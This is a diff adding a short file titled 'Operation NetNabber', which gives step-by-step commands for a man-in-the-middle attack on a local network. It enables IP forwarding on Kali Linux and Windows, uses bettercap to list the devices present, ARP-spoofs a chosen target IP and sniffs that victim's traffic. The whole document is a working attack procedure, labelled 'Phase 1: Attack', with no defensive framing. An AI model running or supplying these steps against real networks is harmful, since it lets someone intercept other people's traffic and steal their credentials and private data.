@@ -1,2 +1,29 @@
 Operation NetNabber
 
+Phase 1: Attack
+
+# Change IP Forwarding in Kali Linux so auto packet drop is disabled 
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+#Change Windows registry to Enable IP Forwarding
+In registry editor browse to  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters
+Modify the value of the parameter IPEnableRouter from 0 to 1 and close the registry editor window
+Restart your system and execute the command "netsh interface ipv4 show interface <if id>" to verify whether IP forwarding is enabled.
+
+#Bettercap for Kali Linux (not natively installed and must be run with sudo privelages) 
+sudo bettercap
+
+#Probe the network to see a list of devices connected
+net.probe on
+
+#Lists all devices on network with MAC address and IP address
+net.show
+
+#Arp spoofing your target IP address
+set arp.spoof.targets <ip address>
+
+#Launch attack 
+arp.spoof on
+
+#Turn the network sniffer on to see the traffic from the victim
+net.sniff on
